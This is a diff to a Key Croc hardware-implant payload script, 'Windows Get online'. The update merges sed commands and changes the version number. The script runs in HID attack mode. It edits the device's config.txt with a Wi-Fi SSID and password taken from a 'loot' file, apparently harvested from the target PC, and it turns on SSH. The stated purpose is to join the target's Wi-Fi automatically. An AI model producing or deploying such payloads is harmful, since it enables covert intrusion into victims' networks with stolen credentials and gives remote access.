@@ -1,7 +1,7 @@
 # Title:           Windows Get online   
 # Description:     Get online automatically to target pc wifi or to your own wifi
 # Author:          spywill / RootJunky
-# Version:         2.2
+# Version:         2.3
 # Category:        Key Croc
 # Props:           Cribbit, Lodrix, potong
 #
@@ -33,7 +33,8 @@ ATTACKMODE HID
 sleep 3
 LED SETUP
 # --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove \r end lines in config.txt file
-$(sed -i '/^[WS]/d' /root/udisk/config.txt) && $(sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt) && $(sed -E -i '1{x;s#^#sed -n 4p root/udisk/loot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' root/udisk/config.txt) && $(sed -i 's/\r//g' root/udisk/config.txt)                        
+$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt) && $(sed -E -i '1{x;s#^#sed -n 4p root/udisk/loot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' root/udisk/config.txt) && $(sed -i 's/\r//g' root/udisk/config.txt)                        
 sleep 2
 Q UNLOCK
 LED FINISH
+
